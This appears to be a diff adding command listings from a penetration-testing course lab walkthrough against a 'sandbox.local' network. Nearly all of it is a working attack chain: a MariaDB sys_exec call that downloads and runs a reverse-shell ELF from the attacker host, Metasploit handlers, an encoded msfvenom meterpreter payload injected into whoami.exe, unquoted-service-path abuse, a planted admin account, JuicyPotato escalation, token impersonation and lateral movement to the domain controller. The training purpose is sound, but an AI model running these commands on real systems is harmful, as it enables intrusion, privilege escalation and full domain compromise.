@@ -262,6 +262,253 @@ MariaDB [(none)]> select sys_exec('wget http://10.11.0.4/shell.elf');
 
 MariaDB [(none)]> select sys_exec('chmod +x ./shell.elf');
 
+kali@kali:~$ sudo msfconsole -q -x "use exploit/multi/handler;\
+ set PAYLOAD linux/x86/meterpreter/reverse_tcp;\
+ set LHOST 10.11.0.4;\
+ set LPORT 443;\
+ run"
+ 
+ MariaDB [(none)]> select sys_exec('./shell.elf');
+ 
+ meterpreter > shell
+ 
+ whoami
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ Post-Exploitation Enumeration 
+meterpreter > shell
+cat /etc/issue
+cat /proc/version
+env
+netstat -tulpn
+cat /etc/fstab
+cd /mnt/scripts
+ls
+cat system_report.ps1
 
-Page 793
 
+
+
+
+
+
+
+Creating a Stable Reverse Tunnel 
+ssh -V
+ssh-keygen
+cat /var/lib/mysql/.ssh/id_rsa.pub
+kali@kali:~$ sudo netstat -tulpn
+
+
+
+
+
+
+Network Enumeration
+kali@kali:~$ proxychains nmap --top-ports=20 -sT -Pn 10.5.5.20
+
+
+
+
+
+
+
+
+
+Exploitation (Or Just Logging In) 
+kali@kali:~$ proxychains xfreerdp /d:sandbox /u:alex /v:10.5.5.20 +clipboard
+
+
+
+
+
+
+
+
+Post-Exploitation Enumeration 
+C:\Users\alex>systeminfo
+C:\Users\alex>netstat -ano
+C:\Users\alex>net user /domain alex
+C:\Users\alex>wmic service get name,displayname,pathname,startmode
+C:\Users\alex>wmic service get name,displayname,pathname,startmode | findstr /i "auto"
+
+C:\Users\alex>wmic service get name,displayname,pathname,startmode |findstr /i "auto"
+|findstr /i /v "c:\windows"
+
+C:\Users\alex>icacls "C:\Puppet"
+
+
+
+
+
+
+
+Unquoted Search Path Exploitation
+kali@kali:~$ mkdir poultry
+kali@kali:~$ cp /usr/share/windows-resources/binaries/whoami.exe ./poultry/
+kali@kali:~$ cd poultry/
+
+kali@kali:~/poultry$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.11.0.4
+LPORT=80 -e x86/shikata_ga_nai -i 7 -f raw > met.bin
+
+PE Target: /home/kali/poultry/whoami.exe
+
+Enable Stealth Mode? (Y/N/H): N
+
+Select Payload: /home/kali/poultry/met.bin
+
+Is this payload a reflective DLL loader? (Y/N/H): N
+
+kali@kali:~$ sudo python3 -m http.server 80
+
+kali@kali:~$ sudo msfconsole -q -x "use exploit/multi/handler;\
+ set PAYLOAD windows/meterpreter/reverse_tcp;\
+ <span custom-style="BoldCodeRed">set AutoRunScript
+post/windows/manage/migrate;\
+
+meterpreter > shell
+
+C:\Windows\system32>whoami
+
+C:\Windows\system32>net user poultryadmin OffSecHax1!
+
+kali@kali:~$ proxychains xfreerdp /u:poultryadmin /v:10.5.5.20 +clipboard
+
+
+
+
+
+
+Post-Exploitation Enumeration 
+meterpreter > use incognito
+meterpreter > list_tokens -u
+
+
+
+
+
+
+Internal Network Enumeration 
+C:\Users\poultryadmin>for /L %i in (1,1,255) do @ping -n 1 -w 200 10.5.5.%i > nul &&
+echo 10.5.5.%i is up.
+
+kali@kali:~$ proxychains nmap --top-ports=1000 -sT -Pn 10.5.5.25,30 --open
+
+
+
+
+
+
+
+
+Reviewing the Results
+kali@kali:~/poultry$ proxychains nmap -
+p53,88,135,139,389,445,464,593,636,3268,3269,3389 -sC -sT -Pn 10.5.5.30
+
+kali@kali:~/poultry$ proxychains nmap -p135,139,445,8080 -sC -sT -Pn 10.5.5.25
+
+kali@kali:~$ proxychains dirb http://10.5.5.25:8080/ -w
+
+kali@kali:~$ cd ~
+kali@kali:~$ mkdir cevapi
+kali@kali:~$ cd cevapi/
+kali@kali:~/cevapi$ cp ../poultry/whoami.exe ./
+
+kali@kali:~/cevapi$ sudo python3 -m http.server 80
+
+meterpreter > shell
+
+C:\Program Files (x86)\Jenkins\workspace\Access>whoami
+
+C:\Program Files (x86)\Jenkins\workspace\asdf>net user jenkinsuser
+
+C:\Program Files>whoami /priv
+
+C:\Program Files (x86)\Jenkins\workspace\Access>systeminfo
+
+
+
+
+
+
+
+Privilege Escalation
+C:\Program Files (x86)\Jenkins\workspace\Access>exit
+meterpreter > upload /home/kali/cevapi/JuicyPotato.exe c:/Users/Public/JuicyPotato.exe
+C:\Program Files>exit
+meterpreter > background
+msf5 exploit(multi/handler) > run
+meterpreter > shell
+C:\Windows\system32>whoami
+
+
+
+
+
+
+
+Post Exploitation Enumeration
+C:\Windows\system32>exit
+meterpreter > use incognito
+meterpreter > list_tokens -u
+meterpreter > impersonate_token sandbox\\Administrator
+meterpreter > getuid
+meterpreter > shell
+C:\Windows\system32>whoami
+C:\Windows\system32>net user /domain administrator
+
+
+
+
+
+
+
+Exploiting the Domain Controller 
+C:\Windows\system32>nslookup
+> set type=all
+> _ldap._tcp.dc._msdcs.sandbox.local
+> exit
+meterpreter > shell
+C:\Windows\system32>powershell
+PS C:\Windows\system32> $dcsesh = New-PSSession -Computer SANDBOXDC
+PS C:\Windows\system32> Invoke-Command -Session $dcsesh -ScriptBlock {ipconfig}
+
+PS C:\Windows\system32> Copy-Item "C:\Users\Public\whoami.exe" -Destination
+"C:\Users\Public\" -ToSession $dcsesh
+
+meterpreter > background
+
+msf5 exploit(multi/handler) > run -j
+
+msf5 exploit(multi/handler) > sessions -l
+
+msf5 exploit(multi/handler) > sessions -i 2
+
+meterpreter > shell
+
+C:\Windows\system32>powershell
+
+PS C:\Windows\system32> $dcsesh = New-PSSession -Computer SANDBOXDC
+
+PS C:\Windows\system32> Invoke-Command -Session $dcsesh -ScriptBlock
+{C:\Users\Public\whoami.exe}
+
+^C
+Terminate channel 2? [y/N] y
+meterpreter > background
+
+msf5 exploit(multi/handler) > sessions -l
+
+msf5 exploit(multi/handler) > sessions -i 3
+
+meterpreter > shell
+
+C:\Users\Administrator\Documents>whoami
+
+C:\Users\Administrator\Documents>hostname
